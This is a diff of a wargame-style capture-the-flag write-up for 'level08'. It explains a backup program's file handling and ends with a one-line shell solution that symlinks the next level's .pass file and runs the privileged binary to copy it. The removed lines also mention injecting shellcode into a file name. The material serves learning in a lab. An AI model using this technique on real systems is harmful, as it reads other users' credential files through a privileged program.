@@ -1,9 +1,16 @@
-to test the log file i changed the backups/.log to /tmp/AAAA/.log
-* open the backups folder and test if its opened successfuly  
-* argv[1] 
+* in this challenge the program expect to have one argument, if not it display the usage.
+* calls fopen with write permission and "./backups/.log" as parameters.
+* if successfully opened the log file it calls the function log_wrapper() to write to log file that the backup starts.
+* calls fopen with read permission and the file that we want to backup as its first parameter.
+* if successfully opened the file , it calls open to creat the backup file inside the folder ./backups.
+(if any error happens when reading or opening "./backups/.log", argv[1], it display error and exit)
+* after that the main() start copying character by character from the file that we want to backup (argv[1]) to the backup file.
+* calls log_wrapper() to write msg indecating that the backup finished to log file (./backups/.log).
 
-possible exploit :
-        * inject shellcode in file name
+==> to solve this challenge 
++ create a folder backups in /var/tmp
++ create a log file inside /var/tmp/backups/.log
++ create a symbolic link of /home/users/level09/.pass
++ execute /home/users/level08/level08 [symbolic link]
 
-
-        * open return NULL while opening "./backups/.log" with "w" permision (verify with getfacl command) this happen at least in gdb 
+cd /var/tmp/ && mkdir backups && touch backups/.log && ln -s /home/users/level09/.pass .pass && /home/users/level08/level08 .pass
